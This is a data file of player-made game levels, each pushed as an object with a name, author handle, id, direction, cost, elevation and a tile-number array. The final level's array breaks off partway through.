maps.push({name="Jump to safety",author="Luffaren",id="#1672297548",direction="right",cost=524,elevation=-4,map=[14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,90,14,14,90,0,0,0,0,0,0,0,0,0,0,0,10,10,89,10,2,160,160,160,160,0,0,0,0,0,0,0,0,0,0,10,89,10,10,10,2,160,160,160,160,0,0,0,0,0,24,3,0,0,10,10,10,10,10,10,10,160,160,160,160,0,0,0,0,94,44,100,0,0,0,65,65,65,65,0,0,160,160,160,160,0,0,0,0,0,93,0,0,0,0,65,65,65,65,0,0,160,160,160,160,0,0,0,0,0,0,0,0,0,0,65,65,65,65,0,0,160,160,160,160,0,0,0,0,0,0,0,0,0,0,65,65,65,65,0,0,160,160,160,160,0,0,0,0,0,0,0,0,0,0,65,65,65,65,0,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,67,65,65,65,65,67,0,160,160,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,160,160,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,67,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,67,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,0,0,0,0,0,0,162,162,162,162,162,162,162,162,162,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Through the hole",author="Luffaren",id="#1672299447",direction="left",cost=288,elevation=-4,map=[1,1,1,1,1,1,1,1,1,0,0,0,0,0,9,9,2,2,9,9,1,5,5,5,90,5,5,90,1,0,0,0,0,9,9,9,9,9,9,9,2,5,89,5,5,5,5,132,1,0,0,0,0,9,9,9,9,9998,9,9,2,5,5,5,90,5,5,90,1,0,0,0,90,14,13,12,11,10,9,9,1,5,5,1,1,1,1,1,1,0,0,0,14,14,13,12,11,10,9,29,1,95,95,1,0,0,0,0,0,0,0,0,14,14,9998,14,14,14,29,127,1,100,5,1,0,0,0,0,0,0,0,0,14,14,14,89,14,14,188,29,1,1,1,1,0,0,0,0,0,0,0,0,90,14,14,14,14,90,0,188,14,14,89,14,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,13,13,15,15,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,12,12,16,16,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,11,11,17,17,17,0,0,0,41,0,0,0,0,0,0,36,36,0,189,29,10,10,17,17,17,0,0,67,21,67,0,0,0,0,0,15,15,0,9,141,10,10,65,65,38,0,0,0,24,0,0,187,34,90,14,14,14,14,19,19,10,10,65,65,65,67,0,0,118,0,0,0,128,14,14,89,14,14,19,89,10,10,65,65,38,0,0,0,24,0,0,187,34,90,14,14,14,65,19,19,17,17,17,17,17,0,0,67,21,67,0,0,0,19,19,14,65,65,19,94,17,131,17,17,17,0,0,0,41,0,0,0,0,93,19,19,160,160,19,19,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,67,67,9998,19]});
maps.push({name="Wallways",author="Luffaren",id="#1672301152",direction="right",cost=303,elevation=-9,map=[0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,127,14,14,127,0,0,0,0,0,0,0,0,0,0,5,89,5,2,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,5,5,5,2,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,67,65,65,65,67,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,67,65,65,65,67,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,9998,5,5,9998,9998,0,0,0,34,34,0,0,0,0,0,0,0,0,1,1,1,95,95,95,1,0,0,0,34,34,0,0,0,0,0,0,0,0,1,106,105,105,105,124,1,77,0,14,14,14,14,0,77,0,0,0,0,0,1,106,0,0,0,124,1,1,1,1,95,95,1,1,1,0,0,0,0,1,1,107,0,0,0,124,1,1,90,114,114,114,114,90,1,1,1,1,1,1,108,108,0,0,8,124,124,1,114,114,65,65,114,114,1,112,111,110,109,108,108,0,0,0,0,124,1,1,114,65,65,65,65,114,1,112,0,0,0,0,0,0,0,0,0,124,124,1,114,65,65,65,65,114,1,113,0,0,0,0,0,0,0,0,93,9998,1,1,114,65,65,65,160,114,9998,114,0,0,14,0,0,0,0,0,10,124,93,1,114,65,65,160,160,162,67,0,0,0,0,0,0,12,0,0,188,124,1,1,114,65,65,160,162,162,67,0,0,0,0,0,0,0,0,0,0,123,1,1,94,114,162,162,162,162,67,0,0,0,0,0,0,0,0,0,123,123,1,1,1,94,114,114,114,114,9998,114,115,116,117,118,119,120,121,122,123,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0]});
maps.push({name="Respect the stream",author="Luffaren",id="#1672303203",direction="forward",cost=130,elevation=-19,map=[0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,25,145,0,0,0,0,0,94,24,24,94,0,0,0,0,0,145,25,0,0,93,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,93,0,0,100,25,145,0,0,0,0,0,160,160,0,0,0,0,0,145,25,100,0,0,5,129,25,0,0,0,0,0,160,160,0,0,0,0,0,25,128,5,0,0,0,25,145,0,0,0,0,0,160,160,0,0,0,0,0,145,25,0,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,126,5,145,0,0,0,0,0,160,160,0,0,0,0,0,145,5,126,0,0,0,0,0,0,0,0,0,0,160,160,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,5,0,0,0,0,0,0,0,0,0,0,126,5,145,0,0,0,0,128,5,5,129,0,0,0,0,145,5,126,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0]});
maps.push({name="Reward by gauntlet",author="Luffaren",id="#1672306747",direction="left",cost=363,elevation=0,map=[128,12,12,12,12,65,0,0,0,0,0,0,158,0,199,9,2,2,9,0,9998,9,9,9,9,24,93,24,94,0,0,0,21,145,199,94,9,9,94,0,2,9,9,9,9,93,24,93,24,77,0,0,0,0,199,9,9,9,9,0,2,9,89,9,9,24,93,24,94,0,0,0,0,0,199,9,9,9,9,0,9,9,9,9,9,93,24,93,24,77,158,17,145,0,199,9,9,9,9,0,0,89,9,9,9,24,93,24,94,0,0,0,0,0,199,9,9,9,9,0,0,9,9,9,9,93,24,93,24,77,0,0,0,0,199,9,9,9,9,0,67,65,65,65,65,199,77,0,77,0,0,0,0,0,199,9,9,9,9,0,67,65,65,65,65,199,162,10,0,160,0,145,158,0,199,9,9,9,9,0,67,65,65,65,65,199,0,145,145,10,0,11,16,145,199,9,9,9,9,0,0,9,9,9,9,9,77,0,0,0,145,160,0,0,199,9,89,9,9,0,0,9,9,9,9,199,0,0,0,162,10,0,145,0,199,9,9,9,9,0,0,9,9,9,9,199,0,0,0,0,0,161,12,0,199,9,9,9,9,0,0,9,89,9,9,199,145,11,129,0,0,0,0,0,199,9,9,9,9,0,0,9,9,9,9,199,199,199,199,199,199,199,199,199,199,9,9,9,89,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,9,9,9,9,89,9,9,9,9,9,9,9,0,0,9,9,9,9,9,9,89,9,9,9,9,9,9,9,9,9,9,9,0,0,90,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Entry exit tower",author="Luffaren",id="#1672310922",direction="right",cost=316,elevation=19,map=[0,0,0,39,145,0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,93,39,0,0,0,0,67,1,105,105,105,105,105,105,105,105,1,0,0,90,19,90,0,0,0,0,67,1,105,0,0,25,25,0,0,105,1,0,19,19,19,19,0,0,0,0,0,1,105,0,0,25,25,0,0,105,1,19,19,19,89,19,20,41,42,43,24,95,124,44,44,185,185,44,44,124,2,19,19,19,19,19,20,41,42,43,24,95,124,44,44,185,185,44,44,124,2,0,19,19,19,19,0,0,0,0,0,1,105,0,0,25,25,0,0,105,1,0,0,90,19,90,0,0,0,0,67,1,105,0,0,25,25,0,0,105,1,0,0,0,94,39,0,0,0,0,67,1,105,105,105,105,105,105,105,105,1,0,0,0,39,145,0,0,0,0,0,1,1,1,1,95,95,1,1,1,1,0,0,0,0,0,0,0,0,0,14,12,12,12,12,5,5,5,65,67,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,5,5,5,65,67,0,0,0,0,0,0,0,0,0,0,14,12,9998,11,11,5,5,5,65,67,0,0,0,0,0,0,0,0,0,0,12,12,12,10,10,5,89,5,65,67,0,0,14,14,9998,14,0,67,0,0,14,12,12,9,9,5,5,5,65,67,0,0,3,20,126,14,34,34,33,12,12,89,12,8,8,5,5,5,65,67,0,0,3,20,20,14,34,34,33,12,12,12,12,7,7,5,5,5,65,67,0,0,14,14,14,14,0,67,0,0,14,12,12,6,6,9998,5,5,65,67,0,0,0,0,0,0,0,0,0,0,12,12,12,5,5,5,89,5,65,67,0,0,0,0,0,0,0,0,0,0,14,12,12,5,5,5,5,5,65,67,0]});
maps.push({name="Brain Fart",author="GandalfThePimp",id="#1672323362",direction="forward",cost=435,elevation=0,map=[0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,5,5,5,144,144,144,144,0,0,0,0,0,0,0,0,0,144,144,5,5,5,5,5,144,144,5,5,144,0,0,0,0,0,0,144,144,144,5,5,5,5,5,144,144,144,144,144,5,144,0,0,0,0,0,90,5,5,5,5,5,144,144,144,144,25,0,0,0,144,144,0,0,0,0,5,5,5,5,5,5,144,25,25,144,144,0,25,144,5,144,144,0,0,0,90,5,5,5,144,144,144,144,144,144,0,144,25,144,0,144,144,0,0,0,5,5,5,5,45,45,0,144,25,25,144,144,0,144,144,25,0,0,0,0,90,5,5,5,45,45,144,144,144,144,144,0,25,144,144,144,0,0,0,0,5,5,5,5,0,144,144,144,25,144,25,144,144,5,5,5,0,0,0,0,90,5,5,5,144,144,144,144,144,144,144,144,5,5,5,5,0,0,0,0,144,5,5,5,5,5,5,5,144,0,144,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,144,5,5,5,5,0,0,0,0,0,0,0,144,144,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0]});
maps.push({name="Chill Trigger",author="GandalfThePimp",id="#1672325510",direction="right",cost=225,elevation=3,map=[0,12,12,2,2,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,1,52,52,52,52,52,52,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,52,52,52,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,52,52,52,1,0,0,0,0,0,0,0,93,100,93,0,0,0,0,0,1,52,52,52,1,0,0,0,0,0,0,0,42,42,42,0,0,0,0,0,1,52,52,52,173,168,0,0,0,174,32,3,42,42,42,0,0,0,0,0,1,52,52,52,176,168,0,0,0,177,32,3,42,42,42,0,0,0,0,0,1,52,52,52,1,0,0,0,0,0,0,0,42,42,42,0,0,0,0,0,1,148,148,148,1,0,0,0,0,0,0,0,94,131,94,0,0,0,0,0,1,60,60,60,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,60,60,60,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,60,60,60,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,1,60,60,60,1,0,0,0,0,0,0,0,0,0,0,0,1,55,55,0,1,60,60,60,1,1,1,1,1,1,1,1,1,1,1,1,1,55,55,0,1,60,60,60,59,59,59,58,58,58,57,57,57,57,56,56,56,55,2,0,1,60,60,60,59,59,59,58,58,58,57,57,57,57,56,56,56,55,2,0,1,60,60,60,59,59,59,58,58,58,57,57,57,57,56,56,56,55,55,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,132,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,55,55]});
maps.push({name="sk8r boi",author="chinny",id="#1672325963",direction="forward",cost=416,elevation=19,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,0,131,5,5,5,5,96,143,143,143,143,95,135,135,135,135,135,0,1,1,0,131,5,5,5,5,96,105,105,105,105,95,135,135,135,135,0,135,1,1,0,0,0,0,0,0,0,199,199,199,199,0,0,0,0,0,135,135,1,1,0,11,135,0,135,12,135,0,0,0,0,12,135,0,0,0,6,6,1,0,135,135,11,135,0,135,135,135,12,135,135,135,0,135,0,0,135,135,0,0,135,135,11,135,0,0,0,0,0,0,0,0,135,135,135,0,135,135,0,11,135,135,0,0,0,135,135,135,135,17,0,0,13,13,13,0,135,135,0,11,135,0,0,16,135,0,135,135,135,17,135,0,0,135,135,0,135,135,0,0,0,135,0,135,16,135,0,0,0,135,135,0,0,135,135,0,135,135,0,0,135,135,0,135,135,0,0,131,17,135,135,0,0,135,135,0,0,135,0,0,135,135,0,135,135,0,0,17,17,135,135,0,135,0,135,0,135,0,0,0,10,10,0,135,135,0,0,0,0,0,0,0,135,135,0,0,135,135,7,0,135,135,0,135,0,135,135,15,135,0,135,135,14,135,0,135,135,135,7,0,135,0,0,0,135,135,135,15,135,135,0,135,135,14,0,135,135,0,0,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,0,7,135,0,0,0,135,135,0,0,135,135,135,135,8,135,135,0,135,135,135,135,7,0,0,0,135,9,135,135,0,135,135,135,8,135,135,135,0,135,135,135,0,1,0,0,9,135,135,135,135,0,0,0,0,0,199,199,199,7,7,199,1,132,1,0,0,0,0,0,0,0,0,0,2,2,24,24,24,24,24,24,97,24,1]});
maps.push({name="pls be nature theme",author="chinny",id="#1672325985",direction="forward",cost=568,elevation=12,map=[10,2,2,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,10,90,10,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,65,65,65,10,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,67,65,65,65,65,90,10,0,0,0,0,0,0,0,0,0,0,0,0,0,10,90,65,65,65,11,90,10,90,10,0,90,11,90,0,0,0,0,0,0,0,10,90,66,66,66,66,90,129,90,10,10,90,10,90,10,3,90,10,0,0,90,10,66,66,66,66,127,66,66,90,90,11,90,10,90,22,22,90,0,0,12,11,66,66,66,66,66,66,66,66,66,66,66,66,13,23,90,22,0,0,90,10,66,66,66,10,11,66,66,66,66,66,66,10,17,22,65,65,22,0,11,90,66,66,66,12,93,11,10,66,66,16,90,67,22,90,65,65,90,10,90,90,10,66,66,66,12,90,66,66,66,90,67,67,65,65,66,65,22,11,10,90,90,10,66,66,66,66,66,12,66,67,65,65,65,66,66,65,90,90,11,22,67,90,66,13,90,66,66,90,13,22,65,65,65,66,66,65,22,90,22,90,22,66,66,125,14,66,10,67,22,90,65,65,66,66,66,65,22,10,22,65,22,18,67,22,67,67,22,65,65,65,66,66,66,90,66,65,90,90,22,65,65,22,65,65,65,65,90,65,65,66,66,93,22,66,66,65,90,10,10,22,65,65,65,65,65,65,65,66,66,66,90,66,66,66,65,65,22,90,90,10,22,23,90,23,65,66,66,66,66,66,66,65,65,65,65,65,90,0,10,90,22,90,23,24,23,65,65,65,65,65,65,65,65,90,22,90,22,0,10,93,0,0,90,23,90,23,22,90,22,22,90,22,90,22,2,2,90]});
maps.push({name="Follow The Props",author="ZpLit",id="#1672327274",direction="forward",cost=203,elevation=0,map=[0,0,0,0,11,0,0,0,11,2,2,11,0,0,0,0,0,0,0,0,0,0,0,11,93,11,0,0,11,45,45,11,0,0,0,0,0,0,0,0,0,0,0,11,45,11,11,11,11,45,45,11,11,11,11,0,0,0,0,0,0,0,0,11,45,11,45,45,45,45,45,45,45,45,90,11,0,0,0,0,0,0,0,11,45,11,45,11,11,11,11,11,11,11,45,11,0,0,0,0,0,0,0,11,45,11,45,45,45,11,45,45,45,45,45,11,0,0,0,0,0,0,0,11,45,11,11,11,45,11,45,11,11,11,45,11,0,0,0,0,0,0,0,11,45,45,45,45,45,11,45,11,45,95,45,11,0,0,0,0,0,0,0,0,11,11,11,11,11,11,45,11,45,11,45,11,0,0,0,0,0,0,0,0,0,11,45,45,45,11,45,11,45,11,45,11,0,0,0,0,0,0,0,0,0,11,45,11,45,11,45,11,45,11,45,11,0,0,0,0,0,0,0,0,0,0,11,11,45,11,45,45,45,11,45,11,0,0,0,0,0,0,0,0,0,0,0,11,45,11,11,11,11,11,45,11,0,0,0,0,0,0,0,0,0,0,11,90,45,45,45,45,45,45,90,11,0,0,0,0,0,0,0,0,0,0,11,45,11,11,11,11,11,11,45,11,0,0,0,0,0,0,0,0,0,0,11,45,11,0,0,11,45,11,45,11,0,0,0,0,0,0,0,0,0,0,11,45,11,0,0,11,45,45,45,11,0,0,0,0,0,0,0,0,0,0,11,45,11,11,11,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,11,90,45,5,5,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,2,2,11,0,0,0,0,0,0,0,0]});
maps.push({name="patience is key",author="VarunFuego",id="#1672335172",direction="forward",cost=325,elevation=11,map=[0,0,0,0,0,0,1,0,2,2,0,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,25,25,0,0,1,1,1,1,1,0,0,0,1,94,39,19,3,26,0,128,26,26,129,0,26,3,19,39,94,1,0,0,1,85,39,19,3,26,0,128,26,26,129,0,26,3,19,39,90,1,0,0,1,90,39,1,1,1,0,0,127,127,0,0,1,1,1,39,39,1,0,0,1,39,39,1,0,0,0,0,0,0,0,0,0,0,1,96,96,1,0,0,1,91,91,1,1,1,199,0,0,0,0,199,1,1,1,91,91,1,0,0,1,39,39,0,39,97,199,0,30,30,0,199,132,39,0,39,39,1,0,0,1,39,39,0,39,134,199,0,30,30,0,199,99,39,0,39,39,1,0,0,1,90,39,0,0,0,199,199,148,148,199,199,0,0,0,39,90,1,0,0,1,39,39,1,1,1,199,199,36,36,1,1,1,1,1,39,39,1,0,0,1,85,39,39,38,37,98,36,101,101,36,98,37,38,39,39,85,1,0,0,1,88,39,39,38,37,98,36,102,100,36,98,37,38,39,39,88,1,0,0,0,1,1,1,1,199,199,1,36,36,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,199,36,36,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,85,36,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,148,36,36,36,36,36,36,148,1,0,0,0,0,0,0,0,0,0,0,1,41,90,36,36,36,85,90,41,1,0,0,0,0,0,0,0,0,0,0,1,93,41,85,36,36,85,41,93,1,0,0,0,0,0,0,0,0,0,0,1,133,88,85,2,2,85,88,131,1,0,0,0,0,0,0]});
maps.push({name="SUPER MARIO",author="pee",id="#1672340449",direction="left",cost=148,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,29,39,39,39,0,0,29,0,0,0,0,0,0,0,29,29,29,0,0,29,29,39,39,39,0,29,29,0,0,0,0,0,109,29,39,39,29,0,29,29,29,29,39,109,109,29,29,0,0,0,0,109,109,29,29,29,39,39,29,29,29,109,109,109,109,29,29,0,0,0,0,109,109,29,39,29,39,39,109,109,109,93,109,109,109,0,0,0,0,0,2,109,109,39,39,39,39,39,29,29,109,109,109,109,0,0,0,0,0,0,2,109,109,39,39,39,39,39,29,29,109,109,109,109,0,0,0,0,0,0,0,109,109,29,29,39,29,39,29,109,109,94,109,109,109,29,29,0,0,0,0,0,109,39,39,29,29,39,29,29,29,109,109,109,109,29,29,0,0,0,0,0,109,0,39,39,29,39,0,29,29,29,39,109,109,29,29,0,0,0,0,0,109,0,39,39,29,0,0,29,29,39,39,39,0,0,29,0,0,0,0,0,0,0,0,39,0,0,0,0,29,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Pronhub",author="pee",id="#1672341648",direction="forward",cost=258,elevation=2,map=[0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,2,2,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,24,24,24,24,24,24,24,24,24,9,9,0,0,0,0,0,0,0,9,9,24,9,9,9,9,24,9,9,9,9,9,0,0,0,0,0,0,0,9,9,24,9,9,9,9,24,9,9,9,9,9,0,0,0,0,0,0,0,9,9,24,9,9,9,9,24,9,9,9,9,9,0,0,0,0,0,0,0,9,9,24,9,9,9,9,24,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,24,24,24,24,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,51,51,51,51,51,51,51,51,51,51,51,0,0,0,0,0,0,0,0,51,51,51,51,51,51,51,51,51,51,51,51,51,0,0,0,0,0,0,0,51,51,5,5,5,5,5,5,5,5,5,51,51,0,0,0,0,0,0,0,51,51,51,51,51,51,5,51,51,51,51,51,51,0,0,0,0,0,0,0,51,51,51,51,51,51,5,51,51,51,51,51,51,0,0,0,0,0,0,0,51,51,51,51,51,51,5,51,51,51,51,51,51,0,0,0,0,0,0,0,51,51,51,51,51,51,5,51,51,51,51,51,51,0,0,0,0,0,0,0,51,51,5,5,5,5,5,5,5,5,5,51,51,0,0,0,0,0,0,0,51,51,51,51,51,51,51,51,51,51,51,51,51,0,0,0,0,0,0,2,2,51,51,51,51,51,51,51,51,51,51,51,0,0,0,0]});
maps.push({name="Subdivide",author="ZpLit",id="#1672351365",direction="left",cost=235,elevation=0,map=[0,0,0,0,0,0,0,1,11,2,2,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,11,11,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,106,45,45,45,45,106,1,0,0,0,0,0,0,0,0,0,0,0,0,1,106,45,45,45,45,106,1,0,0,0,0,0,0,0,0,1,1,1,1,1,106,45,45,45,45,106,1,0,0,0,0,0,0,1,1,106,106,106,106,106,106,45,45,45,45,106,1,0,0,0,0,0,0,88,11,45,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,2,11,45,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,2,11,45,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,88,11,45,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,1,1,106,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,106,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,45,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,45,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,45,45,45,45,45,106,1,0,0,0,0,0,0,0,1,106,45,45,45,45,45,45,45,45,45,106,1,0,0,0,0,0,0,0,0,1,106,106,106,106,106,106,106,106,106,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Familiar Cliff Face",author="ZpLit",id="#1672352033",direction="right",cost=132,elevation=-14,map=[24,2,2,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,24,24,24,24,1,0,0,0,0,0,0,0,0,1,1,11,11,10,10,88,24,87,90,24,1,0,0,0,0,0,0,1,1,12,12,11,11,10,10,2,24,24,24,24,1,0,0,0,0,1,1,13,13,12,12,11,11,10,10,2,24,24,87,90,1,0,0,1,1,14,14,13,13,12,12,11,11,10,10,88,24,90,24,24,24,1,1,15,15,14,14,13,13,12,12,11,0,0,0,0,24,24,24,17,17,16,16,15,15,14,14,13,13,12,0,0,0,0,0,0,24,17,17,17,17,16,16,15,15,14,14,13,0,0,0,0,0,0,0,0,17,17,17,17,17,16,16,15,15,14,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,16,16,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Spiraal",author="VarunFuego",id="#1672355057",direction="forward",cost=311,elevation=13,map=[0,1,2,2,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,1,25,25,0,0,1,1,1,1,31,31,31,31,88,30,30,30,1,0,0,1,25,25,1,1,1,31,31,31,31,1,1,31,31,31,30,30,1,0,0,1,88,25,1,32,32,31,31,1,1,1,1,1,1,29,29,29,1,0,0,1,25,88,1,32,32,1,1,1,39,39,38,38,1,1,29,88,1,0,0,1,25,25,1,32,32,1,40,39,39,39,0,37,37,1,29,29,1,0,0,1,25,25,1,33,33,1,40,40,39,0,0,37,37,1,29,29,1,0,0,1,26,26,1,33,33,1,40,40,0,0,0,36,37,1,29,29,1,0,0,1,26,26,1,33,33,1,40,41,41,0,0,36,36,1,28,28,1,0,0,1,26,26,1,33,33,1,1,41,41,0,35,35,36,1,28,88,1,0,0,1,26,26,1,33,33,33,1,41,41,0,35,35,1,28,28,28,1,0,0,1,26,26,1,1,33,33,129,42,42,34,34,35,1,28,28,28,1,0,0,1,26,26,27,1,33,33,129,43,43,34,34,1,28,28,28,1,0,0,0,1,26,26,27,1,1,1,1,43,43,1,1,28,28,28,88,1,0,0,0,1,26,26,27,27,27,27,27,43,43,27,88,28,28,28,1,1,0,0,0,1,26,27,27,27,27,27,27,27,27,27,27,28,1,1,1,0,0,0,0,1,1,1,1,1,1,1,1,38,38,1,1,1,1,0,0,17,17,0,0,0,0,0,0,0,0,0,1,38,38,1,0,0,0,0,17,17,21,18,0,0,0,0,0,0,0,0,1,91,91,1,0,0,0,0,17,17,21,18,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,18,18,18]});
maps.push({name="who was in paris",author="VarunFuego",id="#1672355913",direction="forward",cost=353,elevation=9,map=[0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0,1,14,14,54,54,54,53,52,51,50,0,0,129,48,48,5,5,1,0,0,1,126,126,1,1,1,1,1,1,1,1,1,1,1,1,93,93,1,0,0,1,31,31,0,31,0,32,32,129,0,0,14,14,1,1,91,91,1,0,0,1,31,31,0,31,0,32,32,129,0,0,14,14,1,1,91,91,1,0,0,1,31,31,1,1,1,1,1,1,1,1,14,14,1,1,89,91,1,0,0,1,0,0,1,0,1,89,14,14,14,96,14,14,1,1,5,5,1,0,0,1,31,31,1,0,1,14,14,14,85,96,14,97,1,1,5,5,1,0,0,1,0,0,1,0,1,14,14,1,1,1,96,96,1,1,89,5,1,0,1,1,30,30,1,1,1,14,14,1,0,1,114,114,1,1,5,90,1,0,1,14,14,29,14,66,0,128,14,1,0,1,114,114,1,105,105,5,1,0,1,14,14,0,14,66,0,128